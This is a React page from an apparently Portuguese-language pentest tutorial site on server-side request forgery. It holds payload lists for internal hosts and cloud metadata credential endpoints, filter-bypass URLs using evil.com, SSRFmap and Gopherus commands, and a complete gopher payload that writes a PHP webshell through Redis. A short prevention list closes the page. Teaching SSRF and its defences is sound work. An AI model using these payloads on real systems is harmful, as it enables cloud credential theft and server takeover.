import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function SSRF() {
  return (
    <PageContainer
      title="SSRF — Server-Side Request Forgery"
      subtitle="Explore vulnerabilidades SSRF para acessar recursos internos, metadados cloud e serviços protegidos através do servidor alvo."
      difficulty="avancado"
      timeToRead="18 min"
    >
      <h2>O que é SSRF?</h2>
      <p>
        <strong>Server-Side Request Forgery (SSRF)</strong> ocorre quando um atacante consegue fazer o
        servidor realizar requisições HTTP para destinos arbitrários. Isso permite acessar serviços
        internos, metadados de cloud (AWS/GCP/Azure), e portas que não são acessíveis externamente.
      </p>

      <AlertBox type="danger" title="OWASP Top 10 — #10">
        SSRF entrou no OWASP Top 10 em 2021 como uma das vulnerabilidades mais críticas, especialmente
        em ambientes cloud onde pode levar a comprometimento total da infraestrutura.
      </AlertBox>

      <h2>Tipos de SSRF</h2>
      <CodeBlock
        title="SSRF Básico vs Blind"
        code={`# SSRF Básico — você vê a resposta
# Exemplo: URL de preview/fetch
# POST /api/fetch-url
# Body: {"url": "http://internal-server:8080/admin"}
# Resposta: conteúdo da página interna

# Blind SSRF — sem resposta direta
# O servidor faz a requisição mas não retorna o conteúdo
# Detectável via:
# - Diferença no tempo de resposta
# - Comportamento diferente (status codes)
# - DNS callback (Burp Collaborator, interact.sh)

# Semi-blind — informação parcial
# Ex: mensagem de erro revela se porta está aberta/fechada`}
      />

      <h2>Payloads de SSRF</h2>

      <h3>Acessar Serviços Internos</h3>
      <CodeBlock
        title="Payloads para serviços internos"
        code={`# Localhost
http://127.0.0.1:80
http://localhost:8080
http://0.0.0.0:22
http://[::1]:80

# Bypass de filtros de localhost
http://2130706433         # 127.0.0.1 em decimal
http://0x7f000001         # 127.0.0.1 em hex
http://017700000001       # 127.0.0.1 em octal
http://127.1              # Forma curta
http://127.0.0.1.nip.io   # DNS que resolve para localhost
http://spoofed.burpcollaborator.net  # DNS rebinding

# Rede interna
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
http://intranet.empresa.local`}
      />

      <h3>Metadados Cloud</h3>
      <CodeBlock
        title="SSRF para metadados cloud (CRÍTICO)"
        code={`# AWS — Instance Metadata Service (IMDS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Retorna: AccessKeyId, SecretAccessKey, Token (acesso total à AWS!)

# AWS IMDSv2 (mais seguro, requer token)
# Primeiro: PUT http://169.254.169.254/latest/api/token
# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# Depois: GET com header X-aws-ec2-metadata-token: TOKEN

# Google Cloud
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header necessário: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1/`}
      />

      <h3>Bypass de Filtros</h3>
      <CodeBlock
        title="Técnicas de bypass"
        code={`# Encoding de URL
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31

# Double encoding
http://127.0.0.1 → http://%25%33%31%25%33%32%25%33%37...

# Redirecionamento aberto
http://site-permitido.com/redirect?url=http://127.0.0.1

# DNS Rebinding
# 1. Registre domínio que alterna entre IP externo e 127.0.0.1
# 2. Primeira resolução: IP válido (passa no filtro)
# 3. Segunda resolução: 127.0.0.1 (SSRF!)

# Protocolos alternativos
file:///etc/passwd
dict://127.0.0.1:6379/INFO     # Redis
gopher://127.0.0.1:6379/_*1%0d%0a...  # Gopher → Redis RCE

# IPv6
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# Parser confusion
http://127.0.0.1@evil.com
http://evil.com#@127.0.0.1
http://127.0.0.1\\.evil.com`}
      />

      <h2>Exploração com Ferramentas</h2>
      <CodeBlock
        title="Testar SSRF com ferramentas do Kali"
        code={`# Burp Suite — Intruder com lista de payloads SSRF
# 1. Capturar requisição com parâmetro URL
# 2. Enviar para Intruder
# 3. Payload: lista de IPs internos e metadados cloud
# 4. Analisar respostas diferentes

# ffuf para descobrir portas internas
ffuf -u "https://alvo.com/fetch?url=http://127.0.0.1:FUZZ" \\
  -w <(seq 1 65535) -mc 200 -fs 0

# SSRFmap — ferramenta automatizada
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus — gerar payloads gopher para SSRF
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python3 gopherus.py --exploit mysql
# Gera payload gopher para explorar MySQL via SSRF`}
      />

      <h2>SSRF para RCE</h2>
      <CodeBlock
        title="Escalar SSRF para execução de comandos"
        code={`# SSRF → Redis → RCE (via webshell)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp system($_GET['cmd'])%3b%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# SSRF → Elasticsearch → Data leak
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password

# SSRF → Docker API → Container escape
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json`}
      />

      <h2>Prevenção</h2>
      <CodeBlock
        title="Como defender contra SSRF"
        code={`# 1. Whitelist de destinos permitidos (melhor opção)
# 2. Bloquear IPs internos (169.254.x.x, 127.x.x.x, 10.x.x.x, etc.)
# 3. Desabilitar protocolos desnecessários (file://, gopher://, dict://)
# 4. Usar IMDSv2 na AWS (requer token)
# 5. Network segmentation — serviços críticos em rede separada
# 6. Não confiar em resolução DNS do input do usuário
# 7. Validar resposta (tipo de conteúdo, tamanho)`}
      />
    </PageContainer>
  );
}
